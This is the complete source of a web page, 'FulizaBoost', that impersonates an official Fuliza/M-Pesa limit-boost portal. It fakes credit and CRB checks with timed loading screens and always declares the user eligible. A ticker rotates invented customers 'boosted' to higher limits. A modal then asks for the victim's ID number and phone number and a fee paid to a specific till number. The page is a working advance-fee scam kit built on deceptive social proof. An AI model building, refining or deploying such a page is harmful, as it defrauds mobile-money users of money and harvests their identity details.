<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FulizaBoost</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<style>
/* (NO CHANGES — your CSS remains exactly the same) */
body {
  margin:0;
  font-family: 'Inter', sans-serif;
  background:#f3f4f6;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}
.card {
  background:white;
  padding:25px;
  border-radius:20px;
  width:90%;
  max-width:380px;
  box-shadow:0 10px 30px rgba(0,0,0,0.1);
  text-align:center;
}
.top-icon {
  width:70px;
  height:70px;
  background:#e8f5e9;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  margin:0 auto 15px;
  font-size:28px;
  color:#16a34a;
}
.sub-title {
  color:#16a34a;
  font-size:12px;
  font-weight:600;
  letter-spacing:1.2px;
  margin-bottom:10px;
}
.desc {
  font-size:14px;
  color:#6b7280;
  margin-bottom:15px;
}
.input {
  width:100%;
  padding:14px;
  border-radius:12px;
  border:1px solid #ddd;
  margin-top:10px;
}
button {
  width:100%;
  padding:15px;
  border:none;
  border-radius:12px;
  font-size:16px;
  margin-top:15px;
}
.green { background:#16a34a; color:white; }
.dark { background:#0f172a; color:white; }
.loader {
  width:50px;
  height:50px;
  border:5px solid #e5e7eb;
  border-top:5px solid #16a34a;
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin:auto;
}
@keyframes spin {
  100% { transform:rotate(360deg); }
}
.grid {
  display:grid;
  grid-template-columns:1fr 1fr;
  gap:10px;
}
.box {
  padding:15px;
  border-radius:12px;
  background:#f9fafb;
  cursor:pointer;
  border:2px solid transparent;
}
.box.active {
  border:2px solid #16a34a;
  background:#e8f5e9;
}
.fee {
  font-size:12px;
  color:#666;
}
.success-icon {
  width:80px;
  height:80px;
  background:#16a34a;
  color:white;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:30px;
  margin:0 auto 20px;
}
.phone {
  color:#16a34a;
  font-weight:bold;
}
.modal {
  position:fixed;
  top:0; left:0;
  width:100%; height:100%;
  background:rgba(0,0,0,0.5);
  display:none;
  align-items:center;
  justify-content:center;
}
.modal-content {
  background:white;
  width:90%;
  max-width:400px;
  border-radius:20px;
  overflow:hidden;
}
.modal-header {
  background:#16a34a;
  color:white;
  padding:20px;
}
.modal-body {
  padding:20px;
}
.info-box {
  background:#e8f5e9;
  padding:15px;
  border-radius:12px;
  font-size:14px;
  margin-bottom:15px;
}
.modal-actions {
  display:flex;
  gap:10px;
}
.cancel-btn {
  flex:1;
  background:#f3f4f6;
}
.pay-btn {
  flex:1;
  background:#16a34a;
  color:white;
}
.live-activity {
  display:flex;
  align-items:center;
  background:#f1f5f3;
  border-radius:12px;
  padding:12px;
  margin-bottom:15px;
  box-shadow:0 2px 6px rgba(0,0,0,0.05);
  text-align:left;
}
.live-icon {
  font-size:18px;
  color:#16a34a;
  margin-right:10px;
}
.live-label {
  font-size:11px;
  color:#6b7280;
  font-weight:bold;
}
.live-text {
  font-size:13px;
}
</style>
</head>

<body>

<div id="app"></div>

<div class="modal" id="modal">
  <div class="modal-content">
    <div class="modal-header">
      <small>SECURE FULIZA APPLICATION</small>
      <h3 id="modalTitle"></h3>
    </div>

    <div class="modal-body">
      <div class="info-box" id="modalFee"></div>

      <input class="input" placeholder="ID Number">
      <input class="input" placeholder="Enter phone number">

      <div class="modal-actions">
        <button class="cancel-btn" onclick="closeModal()">Cancel</button>
        <button class="pay-btn" id="payBtn">Pay</button>
      </div>
    </div>
  </div>
</div>

<script>
let step = 1;
let selectedAmount = 3000;

const limits = [
{amount:3000, fee:250},{amount:5000, fee:293},{amount:7500, fee:350},
{amount:10000, fee:500},{amount:12500, fee:747},{amount:16000, fee:898},
{amount:21000, fee:1015},{amount:25500, fee:1220},{amount:30000, fee:1533},
{amount:35000, fee:1730},{amount:45000, fee:2000},{amount:60000, fee:2250},
{amount:70000, fee:2500}
];

function getFee(a){ return limits.find(l=>l.amount===a).fee; }

const activityNames = ["Dennis O. (0718****42)","Samuel K. (0709****31)","Allan M. (0723****77)","Victor N. (0791****65)","Eric W. (0702****18)","Paul T. (0715****90)","Kennedy J. (0780****54)","Fredrick O. (0726****11)","Collins M. (0799****73)","Peter K. (0708****29)","Brian O. (0725****80)","Kevin M. (0712****34)","James K. (0798****21)","David N. (0703****55)","Mark O. (0710****66)"];

let lastName = "";
let lastAmount = 0;

function generateActivity(){
  let name, amount;
  do { name = activityNames[Math.floor(Math.random()*activityNames.length)]; } while(name === lastName);
  do { amount = limits[Math.floor(Math.random()*limits.length)].amount; } while(amount === lastAmount);
  lastName = name;
  lastAmount = amount;
  return `${name} boosted to <span style="color:#16a34a;font-weight:600;">Ksh ${amount}</span> just now`;
}

setInterval(()=>{
  let el = document.getElementById("liveActivityText");
  if(el){ el.innerHTML = generateActivity(); }
},5000);

function render(){
  const app = document.getElementById("app");

  if(step===1){
    app.innerHTML = `
    <div class="card">
      <div class="top-icon">👤</div>
      <h2 style="font-weight:800; font-size:26px; margin-bottom:5px;">Fuliza Plus+</h2>
      <div class="sub-title">OFFICIAL VERIFICATION PORTAL</div>
      <p class="desc">Verify your identity to unlock higher daily transaction limits.</p>
      <input class="input" id="phoneInput" placeholder="Enter M-Pesa Number" maxlength="10">
      <button class="green" onclick="next()">Check My Eligibility</button>
    </div>`;
  }

  if(step>=2 && step<=5){
    const texts = ["Connecting...","Checking Usage History...","Verifying CRB Status...","Finalizing Trust Score..."];
    app.innerHTML = `
    <div class="card">
      <div class="loader"></div>
      <h3>${texts[step-2]}</h3>
      <p>Accessing secure databases...</p>
    </div>`;
    setTimeout(()=>{step++;render();},1500);
  }

  if(step===6){
    app.innerHTML = `
    <div class="card">
      <div class="success-icon">✓</div>
      <h2>Congratulations!</h2>
      <p>High Trust Score Detected. 
      <span class="phone" id="userNumber"></span> is eligible for a boost.</p>
      <button class="dark" onclick="next()">Proceed to Upgrade Limit</button>
    </div>`;

    setTimeout(()=>{
      let num = localStorage.getItem("userNumber") || "";
      let el = document.getElementById("userNumber");
      if(el){ el.textContent = num; }
    },100);
  }

  if(step===7){
    app.innerHTML = `
    <div class="card">
      <div class="live-activity">
        <div class="live-icon">↻</div>
        <div>
          <div class="live-label">LIVE ACTIVITY</div>
          <div class="live-text" id="liveActivityText">${generateActivity()}</div>
        </div>
      </div>
      <h3>Select Your Limit</h3>
      <div class="grid">
        ${limits.map(l=>`
          <div class="box ${l.amount===selectedAmount?'active':''}" onclick="select(${l.amount})">
            <strong>Ksh ${l.amount}</strong>
            <div class="fee">Fee: Ksh ${l.fee}</div>
          </div>`).join("")}
      </div>
      <button class="green" onclick="openModal()">Upgrade to Ksh ${selectedAmount}</button>
    </div>`;
  }
}

function next(){
  if(step===1){
    let number = document.getElementById("phoneInput").value.trim();
    number = number.replace(/\s+/g, "");

    if(!/^\d{10}$/.test(number)){
      alert("Enter a valid M-Pesa number (10 digits only)");
      return;
    }

    localStorage.setItem("userNumber", number);
  }
  step++;
  render();
}

function select(a){ selectedAmount = a; render(); }

function openModal(){
  let fee = getFee(selectedAmount);
  document.getElementById("modal").style.display="flex";
  document.getElementById("modalTitle").innerText = "Limit will be boosted to Ksh " + selectedAmount;
  document.getElementById("modalFee").innerHTML =
  `Enter your Safaricom number for VERIFICATION! Once payment to Till Number 
  <b>6363781</b> is confirmed, your boost request will begin processing.`;
  document.getElementById("payBtn").innerText = "Pay Ksh " + fee;
}

function closeModal(){
  document.getElementById("modal").style.display="none";
}

document.addEventListener("DOMContentLoaded", function () {
  render();
});
</script>

</body>
</html>
